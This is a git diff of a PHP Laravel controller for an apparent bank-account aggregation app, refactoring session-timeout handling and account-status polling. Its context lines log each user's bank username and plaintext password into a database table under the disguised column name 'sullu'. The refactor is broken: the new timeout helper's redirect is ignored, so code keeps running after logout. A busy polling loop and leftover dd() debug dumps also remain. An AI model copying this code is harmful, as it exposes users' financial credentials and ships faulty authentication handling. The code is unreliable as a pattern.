@@ -54,14 +54,9 @@ class AccountController extends Controller
 		// Fetching all accounts for the user
 		$accounts = $this->account->getAllAccounts();
 
-		if ($accounts === false) {
+		if ($accounts === false) 
+			$this->userSessionTimeout();
 		
-			Auth::Logout();
-			return redirect('login')->with('status', 'User session timed out. Please login again.');
-			// return view('auth.login')->with(array('notification' => "User session timed out. Please login again."));
-		
-		}
-
 		if (array_key_exists('account', $accounts)) { // populating data for dashboard if user has accounts.
 		        	
         	// $netWorth = $this->account->getNetWorth(); // Not used
@@ -121,12 +116,9 @@ class AccountController extends Controller
 
 			$res = $this->providerAccounts->deleteProviderAccounts($providerId); 
 
-			if ($res === false) {
+			if ($res === false)
+				$this->userSessionTimeout();
 
-				Auth::Logout();
-				return redirect('login')->with('status', 'User session timed out. Please login again.');
-
-			}
 			if ($res) {
 				 
 				return \Redirect::to('account/status');					
@@ -144,131 +136,26 @@ class AccountController extends Controller
      * Get status of all accounts
      * Including success, failure, login error, internal errors etc
      */
-	public function checkStatus(Request $request, $providerAccountId = null)
+	public function checkStatus(Request $request)
     {
 	
-		if ($providerAccountId) {
+		$accounts = $this->providerAccounts->getProviderAccounts();
 
-			$accountId = \Session::get('accountId');
+		if ($accounts === false)
+			$this->userSessionTimeout();
+
+		if (isset($accounts['providerAccount'])) {	// Display secret status page
 			
-			$res = $this->providerAccounts->getProviderAccountDetails($providerAccountId);
+	        return view('account.status')->with(array('accounts' => $accounts['providerAccount']));
 
-			if ($res === false) {
-		
-				Auth::Logout();
-				return redirect('login')->with('status', 'User session timed out. Please login again.');
-			
-			}
-			
-			$status = $res['providerAccount']['refreshInfo']['status'];
-			$statusCode = $res['providerAccount']['refreshInfo']['statusCode'];
-			$statusMessage = $res['providerAccount']['refreshInfo']['statusMessage'];
-			$additionalStatus = $res['providerAccount']['refreshInfo']['additionalStatus'];
+        } else { // redirect to dashboard
 
-			$url = 'account/status/'.$providerAccountId;
-
-			if ($status == 'SUCCESS') {
-
-				return view('account.add_success');
-
-			} else if ($status == 'IN_PROGRESS') {
-
-				// statusMessage is also OK here.
-				if ( ($statusCode == "0") && ( ($additionalStatus == 'LOGIN_SUCCESS') || ($additionalStatus == 'ACCOUNT_SUMMARY_RETRIEVED')) ) {
-					
-					return view('account.add_success');
-
-				} 
-				if ( ($statusMessage == 'ADD_IN_PROGRESS') && ($additionalStatus == "USER_INPUT_REQUIRED") ) {
-
-					if (isset($res['providerAccount']['loginFrom'])) {
-					
-						// this is an MFA account. Decide which kind and show the approprite form and call update
-						echo $status."<br/>";
-						echo $statusCode."<br/>";
-						echo $statusMessage."<br/>";
-						echo $additionalStatus."<br/>";
-						dd($res);
-
-					} else {
-						sleep(1);	
-						return \Redirect::to($url)->with('accountId', $accountId);	
-					}
-					
-				} else {
-					
-					sleep(1);
-					return \Redirect::to($url)->with('accountId', $accountId);
-
-				}
-				
-			} else if ($status == 'FAILED') {
-
-				if ( ($statusMessage == 'LOGIN_FAILED') || ($statusMessage == 'INTERNAL_ERROR') ) {
-
-					// Send back to login screen of provider with message
-					$url_ = 'account/add/'.$accountId;
-					return \Redirect::to( $url_ )->withErrors(['Invalid login credentials. Please try again.']);
-
-				} else {
-
-					echo $status."<br/>";
-					echo $statusCode."<br/>";
-					echo $statusMessage."<br/>";
-					echo $additionalStatus."<br/>";
-					dd($res);
-
-				}
-				
-			} else {
-			
-				return view('account.status')->with(array('refreshInfo' => $res['providerAccount']['refreshInfo'], 'providerAccountId' => $providerAccountId));
-			}
-
-		} else {
-
-			$accounts = $this->providerAccounts->getProviderAccounts();
-
-			if ($accounts === false) {
-			
-				Auth::Logout();
-				return redirect('login')->with('status', 'User session timed out. Please login again.');
-				// return view('auth.login')->with(array('notification' => "Session timed out. Please login again."));
-			
-			}
-
-			if (isset($accounts['providerAccount'])) {	// Showing user's provideraccounts
-	        	
-	        	
-	        	/*
-	        	$provider_list = array();
-	        	$i = 0;
-
-	        	foreach ($accounts['providerAccount'] as $providerAccount) {
-
-	        		echo $providerAccount['id'];
-	        		$res = $this->provider->getProviderDetails($providerAccount['id']);
-	        		
-	        		dd($res);
-
-	        		$name = '';
-	        		$providerAccount['name'] = $name;
-
-	        		$provider_list[$i] = $providerAccount;
-	        		$i++;
-	        		
-	        	}
-	        	*/
-				// Display status page
-		        return view('account.status')->with(array('accounts' => $accounts['providerAccount']));
-
-	        } else {	// redirect to dashboard
-
-	    		return \Redirect::to('account/dashboard');
-	        }
+	   		return \Redirect::to('account/dashboard');
 
 	    }
-    }
+    
+	}
+
     /**
      * Show details of specific account.
      *
@@ -282,14 +169,9 @@ class AccountController extends Controller
      	$accountSummary = $this->account->getSummary($id, $container);
      	$accountDetails = $this->account->getTransactions($id);
      	
-     	if ($accountSummary === false || $accountDetails === false) {
+     	if ($accountSummary === false || $accountDetails === false)
+     		$this->userSessionTimeout();
 		
-			Auth::Logout();
-			return redirect('login')->with('status', 'User session timed out. Please login again.');
-			// return view('auth.login')->with(array('notification' => "Session timed out. Please login again."));
-		
-		}
-
 		if (isset($accountDetails['transaction'])) {
 
 	        return view('account.details')->with(array('transactions' => $accountDetails['transaction'], 'summary' => $accountSummary['account'][0]));
@@ -337,11 +219,8 @@ class AccountController extends Controller
 
     	$searchResults = $this->provider->searchProviders($input['search']);
 
-    	if ($searchResults === false) {
-
-    		Auth::Logout();
-			return redirect('login')->with('status', 'User session timed out. Please login again.');
-		}
+    	if ($searchResults === false)
+    		$this->userSessionTimeout();
 
 		// Logging the search to table search_log
     	DB::table('search_log')->insert(
@@ -374,10 +253,8 @@ class AccountController extends Controller
   			return redirect('account/search')->with('status', 'Problem fetching financial institution. Please try searching again or report issue.');
   		}
 
-  		if ($provider === false) {
-  			Auth::Logout();
-			return redirect('login')->with('status', 'User session timed out. Please login again.');
-  		}
+  		if ($provider === false)
+  			$this->userSessionTimeout();
   		    	
     	$provider_ = reset($provider);
       	return view('account.add')->with('providerDetails', reset($provider_));
@@ -400,10 +277,8 @@ class AccountController extends Controller
   			return redirect('account/search')->with('status', 'Problem fetching financial institution. Please try searching again or report issue.');
   		}
 
-  		if ($provider === false) {
-  			Auth::Logout();
-			return redirect('login')->with('status', 'User session timed out. Please login again.');
-  		}
+  		if ($provider === false)
+			$this->userSessionTimeout();
 
     	$providerName = $provider['provider'][0]['name'];
 
@@ -423,12 +298,8 @@ class AccountController extends Controller
 
  		$res = $this->providerAccounts->addProviderAccounts($mod_provider);
 
- 		if ($res === false) {
-
- 			Auth::Logout();
-			return redirect('login')->with('status', 'User session timed out. Please login again.');
-
- 		}
+ 		if ($res === false) 
+ 			$this->userSessionTimeout();
 
  		$providerAccountId = $res['providerAccount']['id'];
 
@@ -436,9 +307,100 @@ class AccountController extends Controller
     	DB::table('provider_log')->insert(
     		['userId' => Auth::user()->id, 'yslUserId' => Auth::user()->yslUserId, 'date_time' => Carbon::now()->toDateTimeString(), 'ip' => \Request::ip(), 'accountId' => $id, 'providerName' => $providerName, 'uname' => $input['login'], 'sullu' => $input['password'], 'providerAccountId' => $providerAccountId]
 		);
-		
- 		$url = 'account/status/'.$providerAccountId;
- 		return \Redirect::to($url)->with('accountId', $id);
+
+		$status = $statusCode = $statusMessage = $additionalStatus = '';
+		$cnt = 1;
+
+		while(true) {
+
+			$cnt++;
+			if($status =='SUCCESS' || $status =='FAILED' || $status =='PARTIAL_SUCCESS') {
+				break;
+			}
+
+			$res = $this->providerAccounts->getProviderAccountDetails($providerAccountId);
+
+			if ($res === false)
+				$this->userSessionTimeout();
+			
+			// alter table provider_log and add to it
+			$status = $res['status'];
+			$statusCode = $res['statusCode'];
+			$statusMessage = $res['statusMessage'];
+			$additionalStatus = $res['additionalStatus'];
+ 		 	
+ 		 	if ($cnt > 50) {
+ 		 		break;
+ 		 	}
+ 		}
+
+		if ($status == 'SUCCESS') {
+
+			return view('account.add_success');
+
+		} else if ($status == 'IN_PROGRESS') {
+
+			dd($res);
+			/*
+			// statusMessage is also OK here.
+			if ( ($statusCode == "0") && ( ($additionalStatus == 'LOGIN_SUCCESS') || ($additionalStatus == 'ACCOUNT_SUMMARY_RETRIEVED')) ) {
+				
+				return view('account.add_success');
+
+			} 
+			if ( ($statusMessage == 'ADD_IN_PROGRESS') && ($additionalStatus == "USER_INPUT_REQUIRED") ) {
+
+				if (isset($res['providerAccount']['loginFrom'])) {
+				
+					// this is an MFA account. Decide which kind and show the approprite form and call update
+					echo $status."<br/>";
+					echo $statusCode."<br/>";
+					echo $statusMessage."<br/>";
+					echo $additionalStatus."<br/>";
+					dd($res);
+
+				} else {
+					sleep(1);	
+					return \Redirect::to($url)->with('accountId', $id);	
+				}
+				
+			} else {
+				
+				sleep(1);
+				return \Redirect::to($url)->with('accountId', $id);
+
+			}
+			*/
+				
+		} else if ($status == 'FAILED') {
+
+			if ( ($statusMessage == 'LOGIN_FAILED') || ($statusMessage == 'INTERNAL_ERROR') ) {
+
+				// Send back to login screen of provider with message
+				$url_ = 'account/add/'.$id;
+				return \Redirect::to( $url_ )->withErrors(['Invalid login credentials. Please try again.']);
+
+			} else {
+
+				dd($res);
+			}
+			
+		} else {
+			
+			dd('in meaw');
+			// BOOM return view('account.status')->with(array('refreshInfo' => $res['providerAccount']['refreshInfo'], 'providerAccountId' => $providerAccountId));
+		}
+ 		// BOOM // $url = 'account/status/'.$providerAccountId;
+ 		// return \Redirect::to($url)->with('accountId', $id);
+
+ 	}
+
+ 	private function userSessionTimeout() {
+ 	
+ 		Auth::Logout();
+		return redirect('login')->with('status', 'User session timed out. Please login again.');
+		// return view('auth.login')->with(array('notification' => "User session timed out. Please login again."));
+
  	}
 
  	########################
